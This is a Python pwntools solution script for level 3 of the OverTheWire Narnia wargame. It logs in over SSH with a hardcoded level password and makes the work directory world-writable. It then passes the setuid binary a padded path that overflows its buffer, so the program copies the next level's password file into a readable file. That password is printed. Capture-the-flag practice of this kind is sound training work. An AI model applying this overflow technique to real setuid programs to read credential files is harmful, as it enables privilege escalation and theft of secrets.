#!/usr/bin/env python
#encoding:utf-8

import os
import re
from pwn import *
from utils import *

level = 3
host = 'narnia.labs.overthewire.org'
user = 'narnia%d' % level
bin_file = 'narnia%d' % level
password = 'vaequeezee'
pass_file = '/etc/narnia_pass/narnia%d' % (level + 1)
bin_path = '/narnia/%s' % bin_file
source_path = '/narnia/%s.c' % bin_file

# context.log_level = 'debug'
shell = ssh(host=host, user=user, password=password)
# Download challenge related files if not exists.
if not os.path.exists(bin_file):
    shell.download_file(bin_path)
    shell.download_file(source_path)

directory = shell.set_working_directory()
# Create file and give privilege to all users in order to allow the executable to write to it.
pass_filename = pass_file[::-1].split('/', 1)[0][::-1]
shell.touch(pass_filename)
shell.chmod('-R 777 %s' % directory)

SET_PAD_CHAR('/')
shell.run('%s %s' % (bin_path, LEFT_PAD(pass_file, 32 + len(pass_filename))))

password = shell.cat(pass_filename).split('\n')[0]
log.success('Password: %s' % password)
